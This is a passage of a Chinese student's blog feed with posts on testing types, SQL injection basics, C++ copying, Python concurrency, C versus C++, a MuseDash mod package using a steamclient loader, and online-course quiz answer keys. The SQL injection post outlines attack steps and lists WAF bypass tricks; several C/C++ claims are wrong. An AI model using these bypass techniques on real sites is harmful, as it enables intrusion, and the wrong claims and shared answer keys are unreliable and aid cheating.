href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入前置知识及注入原理</title>
      <link href="/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:</p><ol><li>显注</li><li>盲注（无回显）： 时间型、布尔型、报错型</li></ol><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><ol><li>数据库信息泄露</li><li>网页篡改</li><li>网站被挂马，传播恶意软件</li><li>数据库被恶意操作</li><li>服务器被植入后门</li><li>破坏硬盘或者服务器等硬件设备</li></ol><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="如何进行SQL注入的防御"><a href="#如何进行SQL注入的防御" class="headerlink" title="如何进行SQL注入的防御"></a>如何进行SQL注入的防御</h5><ol><li>关闭应用的错误提示</li><li>加waf</li><li>对输入进行过滤</li><li>限制输入长度</li><li>限制好数据库权限，drop/create/truncate等权限谨慎grant</li><li>预编译好sql语句，python和php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</li><li>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</li><li>清晰的编程规范，结对/自动化代码review，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程balabala）已经让SQL注入的风险变得非常低了。</li></ol><h5 id="绕过技术："><a href="#绕过技术：" class="headerlink" title="绕过技术："></a>绕过技术：</h5><ol><li>关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct</li><li>通杀的，内联注释，如 /<em>!select</em>/</li><li>编码，可两次编码</li><li>multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF</li><li>参数绕过，复制参数，id=1&amp;id=1</li><li>组合法 如 and 可以用&amp;&amp;再 URL 编码</li><li>替换法，如 and 改成&amp;&amp;;=可以用 like 或 in 等</li></ol><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拷贝相关</title>
      <link href="/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/"/>
      <url>/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="本篇文章简要记录一下C-拷贝相关的知识以及误区。"><a href="#本篇文章简要记录一下C-拷贝相关的知识以及误区。" class="headerlink" title="本篇文章简要记录一下C++拷贝相关的知识以及误区。"></a>本篇文章简要记录一下C++拷贝相关的知识以及误区。</h5><p>   <strong>首先上定义:</strong><br>   拷贝和浅拷贝是指在对对象一份复制或者复制某些部分时所表现出来的差异。</p><p>   浅拷贝只复制对象的引用，由于是引用，所以当拷贝对象中的属性变化时，原始对象和拷贝对象共享这些属性的变化，也就是说，拷贝对象的属性变化会影响到原始对象的属性。因为是浅拷贝，所以拷贝的对象和原来的对象不是两个的独立存在，而是共享数据存储空间。</p><p>   深拷贝则是在复制对象的指针引用的同时，完全复制一份内容相同的对象。也就是说，深度拷贝会创建一个新的对象，而不仅仅是拷贝其指针引用，因此，它们的变化互不影响。人们可以自由操作两个对象，而不会对另一个产生影响。因此，深拷贝能够完整地承载原对象所有信息。这个复制后的对象与原对象彻底分离，内存空间也不同了。</p><p>   简单地说:浅拷贝会影响原有的数据，相当于做了路径引用；深拷贝是另外开辟了内存空间，相当于复制了一个。</p><p>   <strong>然后是一个比较大的误区(可能是我比较菜所以搞不懂):</strong><br>   使用指针传递值是浅拷贝。</p><p>   当使用指针传递值时，函数参数传递的是指针所指向的内存地址，而不是实际的变量本身。因此，函数内部对于指针所指向的数据进行的操作，会直接影响到原始数据，属于浅拷贝。</p><p>   如果需要进行深拷贝，可以使用其他方式，比如使用引用传递或者复制构造函数等。</p><p><strong>上代码才看得懂！</strong></p><pre class="line-numbers language-c++"><code class="language-c++">指针可以直接访问和修改原数据的地址，从而实现更改原数据。具体操作步骤如下：1. 定义指针变量并初始化为原数据的地址：int data = 10;int* pData = &data;2. 通过指针访问和修改原数据：*pData = 20;  // 将原数据修改为20完整示例代码如下：#include <iostream>using namespace std;int main() &#123;    int data = 10;    int* pData = &data;    cout << "原数据：" << data << endl;    *pData = 20;    cout << "更改后的数据：" << data << endl;    return 0;&#125;输出结果为：原数据：10更改后的数据：20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="今天就这么多，写作业去了。"><a href="#今天就这么多，写作业去了。" class="headerlink" title="今天就这么多，写作业去了。"></a>今天就这么多，写作业去了。</h4>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arcaea</title>
      <link href="/2023/03/08/Arcaea/"/>
      <url>/2023/03/08/Arcaea/</url>
      
        <content type="html"><![CDATA[<h3 id="Final-Verdict"><a href="#Final-Verdict" class="headerlink" title="Final Verdict"></a>Final Verdict</h3><p><img src="https://s2.loli.net/2023/03/09/hOT6eWV85gIwX1j.jpg" alt="第一个必须得是咲弥！"><br><img src="https://s2.loli.net/2023/03/09/NKS61Q3PV8spoIL.jpg" alt="光光怎么哭了呜呜呜"><br><img src="https://s2.loli.net/2023/03/09/zNcPyYS5qmhxXnR.jpg" alt="我可怜的光光"><br><img src="https://s2.loli.net/2023/03/09/gHa1KlTMLGfrCsx.jpg" alt="牵着我的手"><br><img src="https://s2.loli.net/2023/03/09/g6T9YwRuFqBNoHL.jpg" alt="目视崩溃的未来"><br><img src="https://s2.loli.net/2023/03/08/1SqIAni59T7bZ8y.png" alt="贴贴"><br><img src="https://s2.loli.net/2023/03/08/dU8i4P1BxQuTSCt.png" alt="Arcaea的残骸"><br><img src="https://s2.loli.net/2023/03/08/QGgLYvEh7TeakJI.png"><br><img src="https://s2.loli.net/2023/03/08/4ki3oUOtQI2FyRn.png"><br><img src="https://s2.loli.net/2023/03/08/cCpUPTDjX4KLrHi.png" alt="尾声"></p>]]></content>
      
      
      <categories>
          
          <category> 图片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喵斯？快跑！</title>
      <link href="/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/"/>
      <url>/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h5 id="这篇文章就是来吐槽musedash的！"><a href="#这篇文章就是来吐槽musedash的！" class="headerlink" title="这篇文章就是来吐槽musedash的！"></a>这篇文章就是来吐槽musedash的！</h5><p>该死的喵斯，你单单靠自己频繁的联动是注定无法长久地保存音游圈的流量的！<br>首先，那个该死的只能228软妹币一次性买断的曲包机制，<br>以及在各个平台的同一账号购买记录不互通就足够烦恼了。<br>然后，更难受的还得是资源封锁。<br>人家Phigros和Arcaea都有各自在民间广泛流传的自制谱渠道。<br>燃鹅你游官方不给就算了，还任由某个小团体封锁自制的资源。<br>甚至有考核乐理和游戏排行来决定玩家是否能够拥有写谱的资格。<br><strong>对此我只能说是离谱至极！</strong><br>自制铺面本应是趁兴而为。<br>但是，我为了导入一首I Got Smoke不得不加了三个喵斯群，一个考核群。<br>最后还是自己花了6个小时在互联网上找到各方零散资源，<br>再自行尝试修改才成功的。<br>如此可见，如果一个热爱喵斯而实力不强的玩家遇到这种情况，<br>那么将会是一盆冷水浇个透心凉！</p><p>下面的图你们自己看看吧。<br><img src="https://s2.loli.net/2023/03/05/fhio3NYLdr8bFHt.png" alt="载入mdmc"><br><img src="https://s2.loli.net/2023/03/05/Esnuw7XrcQkVjAq.png" alt="最后有折磨多"><br><img src="https://s2.loli.net/2023/03/05/f1KrcBpDX65T7Ow.png" alt="终于搞定了"></p><p>这里是阿里云盘的<a href="https://www.aliyundrive.com/s/UqrJ8R732JC">分享链接</a>，提取码是4qt8</p><p>下面是使用教程:<br>1.“下崽”并解压至没有中文的路径比如桌面(问为什么的找GPT去)<br>2.双击MuseDash文件夹里的那个steamclient_loader文件<br>3.千万不要点MuseDash这个应用程序(你爱试就逝咯)<br>4.如果成功运行，按Q找西瓜图标的自定义包就行了<br>5.如果卡了或命令行卡在下载某个zip文件那就Ctrl+C一下<br>6.实在不行就双击解压出来的另一个文件，选择MuseDash这个应用程序然后漫长等待。<br>7.上一步需要科学上网<br>8.如果按上面做都不行就去该博客GitHub仓库找我。</p><h5 id="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"><a href="#不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。" class="headerlink" title="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"></a>不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。</h5>]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Python的四程理解</title>
      <link href="/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/"/>
      <url>/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h4><p>网络编程，几乎所有网络的通信本质上都是通过socket模块实现。<br>并发编程，将串行的程序变为并发,提升代码执行的效率。<br>线程是计算机中可以被cpu调度的最小单元(真正在工作）。<br>进程是计算机资源分配的最小单元（进程为线程提供资源）。<br>一个进程中可以有多个线程,同一个进程中的线程可以共享此进程中的资源。</p><h4 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h4><p>CPython解释器特有的全局解释器锁，让一个进程中同一个时刻只能有一个线程可以被CPU调用。<br>因为多进程的成本比多线程的成本高，所以建议计算密集型用多进程；IO密集型用多线程。<br>同时创建进程数建议与CPU个数相同，合理创建线程数</p><h4 id="多线程开发"><a href="#多线程开发" class="headerlink" title="多线程开发"></a>多线程开发</h4><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁    pass    lock_object.release() # 释放锁        # 创建一个Thread对象（线程），并封装线程被CPU调度时应该执行的任务和相关参数。    t = threading.Thread(target=task,args=(&#39;xxx&#39;,))        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    t.setDaemon(True/False)        # 线程准备就绪（等待CPU调度），代码继续向下执行。    t.start()    # 等待当前线程的任务执行完毕后再向下继续执行。    t.join()print(&quot;继续执行...&quot;) # 主线程执行完所有代码，不结束（等待子线程）</code></pre><h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>在程序中手动加锁方法：同步锁Lock和递归锁RLock。<br>RLock支持多次申请锁和多次释放；Lock不支持。<br>死锁————由于竞争资源或者由于彼此通信而造成的一种阻塞的现象。<br>有些操作默认都是线程安全的，使用的时无需再通过锁再处理</p><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁（令其它的等待）    pass    lock_object.release() # 释放锁（继续其它的任务）//或者使用with lock_object自动执行 acquire 和 release</code></pre><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><pre><code>import timefrom concurrent.futures import ThreadPoolExecutor# pool = ThreadPoolExecutor(100)# pool.submit(函数名,参数1，参数2，参数...)def task(video_url,num):    print(&quot;开始执行任务&quot;, video_url)    time.sleep(5)# 创建线程池，最多维护10个线程。pool = ThreadPoolExecutor(10)url_list = []for url in url_list:    # 在线程池中提交一个任务，线程池中如果有空闲线程，则分配一个线程去执行，执行完毕后再将线程交还给线程池；如果没有空闲线程，则等待。    pool.submit(task, url,2)    print(&quot;END&quot;)</code></pre><h4 id="多进程开发"><a href="#多进程开发" class="headerlink" title="多进程开发"></a>多进程开发</h4><p>关于在Python中基于multiprocessiong模块操作的进程：<br><em>fork</em>，【unix】【任意位置开始】【快】<br><em>spawn</em>，【unix、win】【main代码块开始】【慢】<br><em>forkserver</em>，【部分unix】【main代码块开始】</p><pre><code>import multiprocessingfrom multiprocessing import Processmultiprocessing.set_start_method(&quot;spawn&quot;)   #选择操作进程def task():    passif __name__ == &#39;__main__&#39;:    #当前进程准备就绪，等待被CPU调度（工作单元其实是进程中的线程）    p1 = multiprocessing.Process(target=task)        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    p.daemon(True/False)        p1.start()    #等待当前进程的任务执行完毕后再向下继续执行    p.join()    #这两行一定要放在初始化之后</code></pre><h4 id="进程锁-amp-进程池"><a href="#进程锁-amp-进程池" class="headerlink" title="进程锁&amp;进程池"></a>进程锁&amp;进程池</h4><p><em><strong>概念与用法与线程相似</strong></em><br>如果在进程池中要使用进程锁，则需要基于Manager中的Lock和RLock来实现。</p><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><p>协程（Coroutine），是程序员通过代码搞出来的一个东西（非真实存在）。<br>协程也可以被称为微线程，是一种用户态内的上下文切换技术。<br>简而言之，其实就是通过一个线程实现代码块相互切换执行（来回跳着执行）。<br>协程比线程更加节省开销，但协程的开发难度大一些。</p><pre><code>&lt;案例&gt;【greenlet】from greenlet import greenletdef func1():    print(1)        # 第1步：输出 1    gr2.switch()    # 第3步：切换到 func2 函数    print(2)        # 第6步：输出 2    gr2.switch()    # 第7步：切换到 func2 函数，从上一次执行的位置继续向后执行def func2():    print(3)        # 第4步：输出 3    gr1.switch()    # 第5步：切换到 func1 函数，从上一次执行的位置继续向后执行    print(4)        # 第8步：输出 4gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第1步：去执行 func1 函数【yield】from yield import yielddef func1():    yield 1    yield from func2()    yield 2def func2():    yield 3    yield 4f1 = func1()for item in f1:    print(item)</code></pre><p>让线程更加有意义:遇到IO请求时自动化切换（异步代码）</p><pre><code>&lt;案例&gt;import asyncioasync def func1():    print(1)    await asyncio.sleep(2)    print(2)    async def func2():    print(3)    await asyncio.sleep(2)    print(4)    tasks = [    asyncio.ensure_future(func1()),    asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))</code></pre><p>写完这些已经很晚了，早上有时间再搞个异步代码和装饰器的文章吧。</p><h3 id="每日一句（多久没写了？）"><a href="#每日一句（多久没写了？）" class="headerlink" title="每日一句（多久没写了？）"></a>每日一句（多久没写了？）</h3><h5 id="其实“正常”才是无数误差交织中的碰巧完美。"><a href="#其实“正常”才是无数误差交织中的碰巧完美。" class="headerlink" title="其实“正常”才是无数误差交织中的碰巧完美。"></a>其实“正常”才是无数误差交织中的碰巧完美。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C&amp;C++</title>
      <link href="/2023/03/03/C-C/"/>
      <url>/2023/03/03/C-C/</url>
      
        <content type="html"><![CDATA[<h4 id="C和C-的部分差别"><a href="#C和C-的部分差别" class="headerlink" title="C和C++的部分差别"></a>C和C++的部分差别</h4><h5 id="1-存储类"><a href="#1-存储类" class="headerlink" title="1.存储类"></a>1.存储类</h5><p><em>存储类定义程序</em>中变量/函数的范围（可见性）和生命周期。<br>C++比较C多了mutable和thread_local类型</p><pre><code>mutable 说明符仅适用于类的对象，使用 thread_local 说明符声明的变量仅可在它在其上创建的线程上访问。 </code></pre><p>注意:<br>从 C++ 17 开始，auto 关键字不再是 C++ 存储类说明符，且 register 关键字被弃用。<br>thread_local用于C++11</p><h5 id="2-函数参数的调用"><a href="#2-函数参数的调用" class="headerlink" title="2.函数参数的调用"></a>2.函数参数的调用</h5><p>C++可以指针调用。<br>该方法把参数的地址赋值给形式参数。在函数内，该地址用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。<br>C不可以使用指针调用。</p><h5 id="3-指针"><a href="#3-指针" class="headerlink" title="3.指针"></a>3.指针</h5><p>C++比较C能够支持空指针。NULL 指针是一个定义在标准库中的值为零的常量。</p><h5 id="4-头文件"><a href="#4-头文件" class="headerlink" title="4.头文件"></a>4.头文件</h5><pre><code>【C】#include &lt;stdio.h&gt;      引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。#include &quot;xxxxx&quot;        引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。【C++】 头文件      函数和描述iostream    该文件定义了 cin、cout、cerr 和 clog 对象，分别对应于标准输入流、标准输出流、非缓冲标准错误流和缓冲标准错误流。iomanip     该文件通过所谓的参数化的流操纵器（比如 setw 和 setprecision），来声明对执行标准化 I/O 有用的服务。fstream     该文件为用户控制的文件处理声明服务。我们将在文件和流的相关章节讨论它的细节。</code></pre><h5 id="5-输入输出"><a href="#5-输入输出" class="headerlink" title="5.输入输出"></a>5.输入输出</h5><pre><code>            【C】        【C++】标准输入    stdin          cin           键盘标准输出    stdout         cout          屏幕标准错误    stderr         cerr          您的屏幕</code></pre><h6 id="6-文件读写"><a href="#6-文件读写" class="headerlink" title="6.文件读写"></a>6.文件读写</h6><p>C与C++的文件操作都属于面向对象，使用起来较为繁琐，需要记住很多函数。<br>对文件的操作都分为三个步骤:打开文件&gt;操作文件&gt;关闭文件</p><pre><code>【C】FILE *fopen( const char *filename, const char *mode );//要打开的文件名,不指定路径,则在当前文件夹找//打开的模式 读r 写w 或追加a//返回值:打开失败返回NULL,打开成功则返回指向文件的标识符int fputc( int c, FILE *fp );//写入文件int fclose( FILE *fp );//关闭文件【C++】int main() &#123;    fstream file;    file.open(&quot;filename&quot;,ios::mode); //以只写模式打开文件    char buf[] = &quot;内容&quot;;    file.write(buf,sizeof(buf));       //写入文件末尾    file.read(buf,mode);              //读文件    file.close();                      //关闭文件&#125;//modeapp      每次写入前寻位到流结尾binary   以二进制模式打开in       以读打开out      以写打开trunc    在打开时舍弃流的内容ate      打开后立即寻位到流结尾</code></pre><h6 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7.异常处理"></a>7.异常处理</h6><p>C++有一个应对出现错误的机制，叫做异常处理。当程序运行发生错误时，可以抛出一个异常，异常处理程序会捕捉它并采取相应的措施。C语言并没有内置的异常机制。</p><h5 id="8-编译器"><a href="#8-编译器" class="headerlink" title="8.编译器"></a>8.编译器</h5><p>C语言和C++语言的编译器可不同。尽管有些编译器支持两种语言，但某些特征可能仅仅由一个语言所支持。</p><h5 id="9-名称空间"><a href="#9-名称空间" class="headerlink" title="9.名称空间"></a>9.名称空间</h5><p>C++有一个关键字叫做namespace，用于区分相同名称的函数和变量。C语言中没有这个特性。</p><h5 id="10-头文件"><a href="#10-头文件" class="headerlink" title="10.头文件"></a>10.头文件</h5><p>在C++中，头文件可以有任何扩展名，而在C语言中，它们必须是.h扩展名。</p><h5 id="11-默认变量初始化"><a href="#11-默认变量初始化" class="headerlink" title="11.默认变量初始化"></a>11.默认变量初始化</h5><p>在C++中，类的成员变量默认情况下会被初始化。而在C语言中，变量的内容是未定义的，程序可能会因此出现意外错误。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>C++语言是C语言的扩展，它包含了所有C语言的特性，并增加了一些特有的特性。C++是一个更为现代化的语言，用于更复杂的编程环境，特别是当需要面向对象编程时，C++是首选语言。而C语言则侧重于系统编程，嵌入式编程等。</p><h5 id="我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。"><a href="#我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。" class="headerlink" title="我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。"></a>我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UOOC中国近现代史纲要答案</title>
      <link href="/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/"/>
      <url>/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h5 id="此文章答案仅为个人记录所用，请勿用于其他用途"><a href="#此文章答案仅为个人记录所用，请勿用于其他用途" class="headerlink" title="此文章答案仅为个人记录所用，请勿用于其他用途"></a><em>此文章答案仅为个人记录所用，请勿用于其他用途</em></h5><h5 id="不保证完全一致，极可能存在多套题组，请核对后再查看"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h5><h5 id="tip：PC网页版刷新后是另一套题组"><a href="#tip：PC网页版刷新后是另一套题组" class="headerlink" title="tip：PC网页版刷新后是另一套题组"></a>tip：PC网页版刷新后是另一套题组</h5><h4 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h4><p>单选<br>1-5:CCABB<br>6-10:DCBDD<br>多选<br>11.AB<br>12-16:ABCD<br>17:BCD<br>18:ACD<br>19:AB<br>20.AB<br>判断<br>21-25:BABBB<br>26-30:BBBBB</p><h4 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h4><p>1-5:ACCDD<br>6-10:CCCBC<br>11:AB<br>12:ABCD<br>13:CD<br>14:BCD<br>15:ACD<br>16-17:ABCD<br>18:BC<br>19:ABCD<br>20:BCD<br>21-25:BBAAB<br>16-20:BAABB</p><h4 id="第3章"><a href="#第3章" class="headerlink" title="第3章"></a>第3章</h4><p>1-5:CBCCC<br>6:ABC<br>7:ABCE<br>8:ABCD<br>9:BCD<br>10:ACD<br>11:AD<br>12:AC<br>13:AB<br>14:BCD<br>15:ABCD<br>16-20:AABBA<br>21-25:BBAAA</p><h4 id="第4章"><a href="#第4章" class="headerlink" title="第4章"></a>第4章</h4><p>1-5:DAADC<br>6-10:AABAC<br>11:ABCDE<br>12:ABDE<br>13:ABCE<br>14:CD<br>15:AB<br>16-17:ABCD<br>18:DE<br>19:ABC<br>20:BC<br>21-25:ABBBA<br>26-30:AAABA</p><h4 id="第5章"><a href="#第5章" class="headerlink" title="第5章"></a>第5章</h4><p>1-5:CCABC<br>6:ABC<br>7:ABCDE<br>8:BCCD<br>9:AB<br>10:ABCD<br>11-12:ABCDE<br>13:ABC<br>14:BC<br>15:ABC<br>16-20:BBABA<br>21-25:BAABA</p><h4 id="第6章"><a href="#第6章" class="headerlink" title="第6章"></a>第6章</h4><p>1-5:CCCDC<br>6-8:ABCDE<br>9:ABC<br>10:ABCD<br>11:BCD<br>12:ABCD<br>13:AD<br>14:AB<br>15:ABC<br>16-20:AABAB<br>21-25:BAAAA</p><h4 id="第7章"><a href="#第7章" class="headerlink" title="第7章"></a>第7章</h4><p>1-5:BCDBB<br>6-10:DBBBD<br>11:ABCD<br>12:ABC<br>13:ACD<br>14:ABCDE<br>15:ABCD<br>16:ABC<br>17:CD<br>18:CD<br>19:CDE<br>20:ABD<br>21-25:AABBA<br>26-30:AAAAAA</p><h4 id="第8章"><a href="#第8章" class="headerlink" title="第8章"></a>第8章</h4><p>1-5:DCBBC<br>6-10:CCDAD<br>11:ABD<br>12:CDE<br>13:AB<br>14:ABCDE<br>15:ABCD<br>16:BCD<br>17:ABCDE<br>18:ABCD<br>19:ABD<br>20:AC<br>21-25:AAAAA<br>26-30:AAABA</p><h4 id="第9章"><a href="#第9章" class="headerlink" 